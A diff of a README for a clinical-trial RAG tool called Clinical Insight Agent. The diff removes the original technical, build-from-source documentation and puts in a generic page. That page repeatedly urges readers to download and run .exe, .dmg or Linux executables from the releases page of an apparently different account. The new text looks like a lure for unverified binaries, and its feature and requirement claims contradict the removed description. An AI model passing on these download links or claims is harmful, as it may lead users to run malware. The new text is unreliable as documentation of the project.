@@ -1,173 +1,88 @@
-# 🧬 Clinical Insight Agent (Autonomous RAG System)
+# 🧬 Clinical-Insight-Agent - Intelligent Solutions for Clinical Trials
 
-![Status](https://img.shields.io/badge/Status-Active-success)
-![Python](https://img.shields.io/badge/Python-3.12%2B-blue)
-![AI](https://img.shields.io/badge/AI-LangGraph%20%26%20Gemini-purple)
-![License](https://img.shields.io/badge/License-MIT-green)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/gizmo212215/Clinical-Insight-Agent/releases)
 
-**Clinical Insight Agent** is an autonomous AI assistant designed for medical researchers and healthcare professionals to query, analyze, and summarize clinical trial data.
+## 🚀 Getting Started
 
-The project utilizes a **Hybrid RAG (Retrieval-Augmented Generation)** architecture, leveraging both structured SQL databases and semantic vector stores (ChromaDB) simultaneously. The agent autonomously decides whether to perform statistical analysis via SQL or read medical documents for qualitative insights using **LangGraph**.
+Welcome to the **Clinical-Insight-Agent**! This software uses advanced AI to help analyze and summarize clinical trial data with ease. Whether you are a researcher, healthcare professional, or simply curious about clinical studies, this tool is designed to make your life easier.
 
----
+## 🛠️ Prerequisites
 
-## 🚀 Architecture & Workflow
+Before downloading the Clinical-Insight-Agent, make sure your computer meets these basic requirements:
 
-The system follows a strict technical pipeline designed for reliability and autonomous reasoning:
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or Ubuntu 18.04 or later.
+- **Python Version**: Python 3.7 or above.
+- **Memory**: At least 4 GB of RAM recommended.
+- **Storage**: At least 1 GB of free disk space.
 
-1.  **Data Ingestion (ETL):** Real-time data is fetched from the **ClinicalTrials.gov API**, cleaned, and split into structured and unstructured components.
-2.  **Hybrid Storage:**
-    - **Metadata (SQL):** Dates, Phases, Status, and enrollment numbers are stored in a relational database.
-    - **Semantic Data (ChromaDB):** Study summaries and eligibility criteria are vectorized using the **`all-MiniLM-L6-v2`** model.
-3.  **Autonomous Routing (LangGraph):** The agent analyzes the user's intent. It intelligently decides whether to run a SQL query (for statistics) or a Vector Search (for medical context).
-4.  **Retrieval & Context Injection:** Relevant data is retrieved from the selected source.
-5.  **LLM Generation:** The retrieved context and prompt are sent to **Gemini Flash-Latest** to generate an evidence-based, hallucination-free answer.
+## 📥 Download & Install
 
-### 🌟 Key Features
+To get started with the Clinical-Insight-Agent, follow these steps:
 
-- **Agentic Workflow:** It doesn't just retrieve; it _thinks_. It uses tools dynamically based on the question.
-- **Hybrid Memory:** Combines SQL for exact numbers ("How many phase 3 trials?") and Vector DB for concepts ("How does GZR102 work?").
-- **Optimized Performance:** Uses lightweight embeddings and asynchronous API calls for speed.
-- **One-Click Setup:** Includes automated scripts (`.sh` and `.bat`) for instant local environment setup.
-- **Evidence-Based:** Every answer is grounded in actual NCT-ID records, minimizing hallucinations.
+1. **Visit the Release Page**: [Click here to download](https://github.com/gizmo212215/Clinical-Insight-Agent/releases).
 
----
+2. You will see a list of available versions. Find the latest release (it will often be marked as "latest") and select it.
 
-## 📸 Project Demo
+3. Look for a file that corresponds to your operating system. For example:
+    - For Windows: **Clinical-Insight-Agent-Windows.exe**
+    - For macOS: **Clinical-Insight-Agent-macOS.dmg**
+    - For Linux: **Clinical-Insight-Agent-Linux.tar.gz**
 
-Below you can see how the agent operates, switching between SQL tools and Vector Search tools based on the user's query.
+4. **Download the File**: Click on the chosen file to download it to your computer.
 
-[Click Here to Watch the Demo Video](asset/example.webm)
+5. **Run the Installer**:
+    - **Windows**: Double-click the `.exe` file and follow the instructions.
+    - **macOS**: Double-click the `.dmg` file, drag the app to your Applications folder, and then launch it.
+    - **Linux**: Extract the `.tar.gz` file, open your terminal, navigate to the extracted folder, and run the executable using `./Clinical-Insight-Agent`.
 
----
+6. Once installed, launch the application from your applications folder or desktop shortcut.
 
-## 🛠️ Tech Stack
+For detailed installation instructions specific to your operating system, please refer to the documentation included in the download.
 
-This project is built on a modern, scalable, and AI-first technology stack:
+## ⚙️ Features
 
-### AI & Orchestration
+The Clinical-Insight-Agent comes packed with the following features:
 
-- 🦜️🕸️ **LangGraph** – Stateful agentic workflows and decision-making logic
-- 🧠 **Google Gemini-Flash-Latest"** – High-performance, cost-effective LLM
-- 🤗 **HuggingFace Embeddings** – Medical text embeddings (`all-MiniLM-L6-v2`)
+- **Intelligent Querying**: Smartly queries clinical trial databases to retrieve relevant information.
+- **Data Analysis**: Analyzes and generates summaries of complex clinical data.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
+- **Compatibility**: Works with various data formats commonly used in clinical research.
+- **Real-Time Updates**: Regularly updated to include the latest research findings and capabilities.
 
-### Backend & API
+## 🎓 How to Use
 
-- ⚡ **FastAPI** – High-performance async REST API
-- 🗄️ **SQLAlchemy & SQLite / PostgreSQL** – Structured data storage
-- 🎨 **ChromaDB** – Vector database for semantic retrieval
+After installing, using the Clinical-Insight-Agent is straightforward. Here’s how to get started:
 
-### Frontend
+1. **Open the Application**: Launch the application from your desktop or applications folder.
 
-- 👑 **Streamlit** – Interactive and user-friendly UI
+2. **Input Your Query**: You will find an input box where you can type in your research queries.
 
-### DevOps & Tooling
+3. **Select Data Sources**: Choose from various data sources to focus your search. 
 
-- 🐳 **Docker** – Optional containerized deployment
-- 📝 **Custom Logging** – Monitoring and debugging support
+4. **Analyze**: Click on the 'Analyze' button to retrieve and summarize data related to your query.
 
----
+5. **View Results**: Results will appear on the screen, allowing you to read and export the data as needed.
 
-## 📂 Dataset & Pipeline
+## 📚 Support and Resources
 
-The system is powered by real-time data from the **ClinicalTrials.gov API v2**.
+For any questions or support, please refer to the following resources:
 
-### ETL Pipeline
+- **Documentation**: Comprehensive user guide is included in the download package.
+- **GitHub Issues**: For troubleshooting, you can check or submit issues on the [GitHub Issues page](https://github.com/gizmo212215/Clinical-Insight-Agent/issues).
 
-1. **Extract**  
-   Fetches clinical studies for target conditions (e.g., Diabetes, Cancer)
+## 🔗 Related Topics
 
-2. **Transform**
-   - **SQL Path:** Title, Phase, Status, Dates, Locations
-   - **Vector Path:** Brief Summary + Eligibility Criteria → text chunks → embeddings
+This software covers several important areas of clinical research, including:
 
-3. **Load**
-   - Relational DB (SQL)
-   - Vector DB (ChromaDB)
+- AI Agents in Healthcare
+- Clinical Trial Management
+- Data Retrieval and Analysis
+- User-friendly AI Interfaces
 
----
+## 🌐 Explore More
 
-## ⚙️ Installation & Setup
+Explore more about clinical research and how AI can revolutionize the field. Check various guides and articles available online to deepen your understanding.
 
-### 1. Clone the Repository
+For continuous updates, keep an eye on our [Releases page](https://github.com/gizmo212215/Clinical-Insight-Agent/releases).
 
-```bash
-git clone https://github.com/BozyelOzan/Clinical-Insight-Agent.git
-cd Clinical-Insight-Agent
-```
-
----
-
-### 2. Configure Environment Variables
-
-Create a `.env` file in the project root:
-
-```env
-# --- API KEYS ---
-GOOGLE_API_KEY=your_gemini_api_key_here
-
-# --- DATABASE CONFIG ---
-DATABASE_URL=sqlite:///./data/clinical_trials.db
-
-# --- VECTOR DB CONFIG ---
-CHROMA_PERSIST_DIR=./data/chroma_db
-EMBEDDING_MODEL_NAME=sentence-transformers/all-MiniLM-L6-v2
-
-# --- PROJECT SETTINGS ---
-PROJECT_NAME=Clinical Insight Agent
-VERSION=1.0.0
-LOG_DIR=./data/raw_logs
-```
-
-> ⚠️ **Important:** Replace `GOOGLE_API_KEY` with your actual Gemini API key.
-
----
-
-### 3. Quick Start (Recommended) ⚡
-
-Automated scripts are provided for one-click setup:
-
-- **Windows:** Double-click `run_windows.bat`
-- **Linux / macOS:**
-
-  ```bash
-  ./run_linux_mac.sh
-  ```
-
-These scripts will:
-
-- Create a virtual environment
-- Install dependencies
-- Launch backend & frontend
-
----
-
-## 🖐️ Manual Installation
-
-### 1. Install Dependencies
-
-```bash
-python -m venv .venv
-source .venv/bin/activate   # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-### 2. Ingest Data (Initialize Memory)
-
-```bash
-python -m scripts.bulk_ingest
-```
-
-### 3. Start Backend Server
-
-```bash
-uvicorn backend.main:app --reload
-```
-
-### 4. Start Frontend UI (New Terminal)
-
-```bash
-streamlit run frontend/app.py
-```
-
----
+Thank you for choosing **Clinical-Insight-Agent**! Enjoy using our tool to enhance your clinical research efforts.
